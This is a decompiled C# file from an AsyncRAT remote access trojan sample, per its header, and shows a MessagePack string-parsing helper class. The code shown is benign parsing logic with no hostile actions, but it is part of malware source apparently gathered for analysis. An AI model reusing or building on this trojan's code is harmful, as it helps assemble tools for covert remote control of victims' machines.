// Decompiled with JetBrains decompiler
// Type: Server.MessagePack.ReadTools
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using System;
using System.IO;

namespace Server.MessagePack
{
  internal class ReadTools
  {
    public static string ReadString(Stream ms, int len)
    {
      byte[] numArray = new byte[len];
      ms.Read(numArray, 0, len);
      return BytesTools.GetString(numArray);
    }

    public static string ReadString(Stream ms) => ReadTools.ReadString((byte) ms.ReadByte(), ms);

    public static string ReadString(byte strFlag, Stream ms)
    {
      int count = 0;
      if (strFlag >= (byte) 160 && strFlag <= (byte) 191)
      {
        count = (int) strFlag - 160;
      }
      else
      {
        switch (strFlag)
        {
          case 217:
            count = ms.ReadByte();
            break;
          case 218:
            byte[] numArray1 = new byte[2];
            ms.Read(numArray1, 0, 2);
            count = (int) BitConverter.ToUInt16(BytesTools.SwapBytes(numArray1), 0);
            break;
          case 219:
            byte[] numArray2 = new byte[4];
            ms.Read(numArray2, 0, 4);
            count = BitConverter.ToInt32(BytesTools.SwapBytes(numArray2), 0);
            break;
        }
      }
      byte[] numArray3 = new byte[count];
      ms.Read(numArray3, 0, count);
      return BytesTools.GetString(numArray3);
    }
  }
}
